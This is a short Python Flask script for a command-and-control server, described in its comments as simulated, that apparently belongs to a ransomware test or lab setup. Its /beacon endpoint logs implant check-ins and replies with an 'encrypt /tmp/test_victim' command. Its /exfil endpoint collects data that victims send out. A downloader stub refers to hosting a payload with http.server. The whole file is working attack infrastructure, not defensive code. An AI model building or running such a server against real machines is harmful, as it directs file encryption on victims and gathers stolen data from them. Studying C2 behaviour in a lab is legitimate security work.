from flask import Flask, request, jsonify
import threading
import time
import json

app = Flask(__name__)

# Simulated C2 data store
beacons = []
exfils = []

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.json or {}
    data['timestamp'] = time.time()
    data['ip'] = request.remote_addr
    beacons.append(data)
    print(f"Beacon received: {data}")
    return jsonify({'status': 'ok', 'command': 'encrypt /tmp/test_victim'})

@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.json or {}
    data['timestamp'] = time.time()
    data['ip'] = request.remote_addr
    exfils.append(data)
    print(f"Exfil received: {data}")
    return jsonify({'status': 'received'})

@app.route('/commands', methods=['GET'])
def get_commands():
    return jsonify({'beacons': len(beacons), 'exfils': len(exfils)})

@app.route('/downloader', methods=['GET'])  # Alias for payload, but serve from http.server
def fake_downloader():
    return "Use http.server for actual payload hosting."

if __name__ == '__main__':
    print("C2 Server starting on http://0.0.0.0:8080")
    app.run(host='0.0.0.0', port=8080, debug=False)
